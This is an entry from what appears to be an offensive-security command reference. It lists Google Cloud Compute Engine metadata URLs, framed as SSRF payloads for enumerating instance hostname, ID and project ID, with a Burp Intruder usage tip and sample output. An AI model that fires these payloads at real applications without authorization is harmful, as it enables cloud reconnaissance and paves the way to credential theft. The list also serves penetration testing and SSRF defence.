---
type: command
executor: bash
data: |-
  http://169.254.169.254/computeMetadata/v1/
  http://metadata.google.internal/computeMetadata/v1/
  http://metadata/computeMetadata/v1/
  http://metadata.google.internal/computeMetadata/v1/instance/hostname
  http://metadata.google.internal/computeMetadata/v1/instance/id
  http://metadata.google.internal/computeMetadata/v1/project/project-id
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - GCP
tags:
  - ssrf
  - metadata
  - enumeration
verified: true
validated: true
---

# list-google-compute-metadata-urls

## Command

```bash
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

## Description

This command lists standard GCP Compute Engine metadata URLs for use as SSRF payloads to enumerate instance and project details.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| http://169.254.169.254/computeMetadata/v1/ | Link-local IP endpoint for metadata | Yes (alternative) |
| http://metadata.google.internal/computeMetadata/v1/ | Internal hostname endpoint | Yes |
| http://metadata/computeMetadata/v1/ | Short alias endpoint | Yes (alternative) |
| /instance/hostname | Specific path for hostname | No |
| /instance/id | Specific path for instance ID | No |
| /project/project-id | Specific path for project ID | No |

## Examples

### Basic Usage

Use individual URLs as payloads:

```bash
http://metadata.google.internal/computeMetadata/v1/instance/hostname
```

### Advanced Usage

Test all in sequence via Burp Intruder to find accessible ones.

## Expected Output

For hostname:

```
instance-hostname
```

For project ID:

```
project-id-123456
```

## Related

- [[procedures/google-cloud-ssrf-metadata-retrieval]]
- [[commands/request-google-instance-disks-metadata-recursive]]
